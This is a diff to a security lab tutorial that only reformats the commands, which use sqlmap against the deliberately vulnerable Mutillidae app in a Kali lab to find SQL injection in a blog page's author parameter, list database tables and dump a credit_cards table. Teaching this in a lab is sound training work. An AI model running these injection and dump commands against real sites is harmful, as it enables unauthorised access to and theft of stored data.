@@ -48,10 +48,12 @@ The remainder of the instructions will be done in your Kali VM.
 
 Open Iceweasel and to go the page http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php. Note that the page has a dropdown where an author can be selected. Even though the dropdown does not allow free text to be entered, it still contains values that will be sent to the database. Because the page accepts user input that is likely sent to a database, it is potentially vulnerable to SQL injection. Typically, you would do an investigation to determine whether a variable might be vulnerable to SQL injection. For example, you might use the Burp Suite to analyze and requests sent to the server. For now, assume that the investigation has been done and the author variable has been determine to be a potentially exploitable variable.
 
-SQLMap comes installed in Kali by default. Run the following command (copy and paste as needed):
+SQLMap comes installed in Kali by default. Run the following command. (Copy and paste as needed. the `\` character is a line continuation character designed to make the command easier to copy. If you are typing the command, this character is not necessary.)
 
 ```
-sqlmap -u "http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" --data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries"
+sqlmap -u \
+"http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" \
+--data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries"
 ```
 
 * The `-u` parameter just passes a URL.
@@ -74,7 +76,10 @@ Press `n` to skip testing the other variables.
 Once a vulnerability has been found, it can be exploited. Append `-D owasp10 --tables` to the previous command and run it. The full command will be:
 
 ```
-sqlmap -u "http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" --data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries" -D owasp10 --tables
+sqlmap -u \
+"http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" \
+--data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries" \
+-D owasp10 --tables
 ```
 
 * The `-D` command specifies the database that should be accessed.
@@ -87,7 +92,10 @@ image::sqlmap-output-tables.png[]
 Interestingly, there is a `credit_cards` table. Run the following command to view the data in that table.
 
 ```
-sqlmap -u "http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" --data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries" -D owasp10 -T credit_cards --dump
+sqlmap -u \
+"http://192.168.2.100/mutillidae/index.php?page=view-someones-blog.php" \
+--data="author=admin&view-someones-blog-php-submit-button=View+Blog+Entries" \
+-D owasp10 -T credit_cards --dump
 ```
 
 * The `-T` parameter specifies a database table to access.
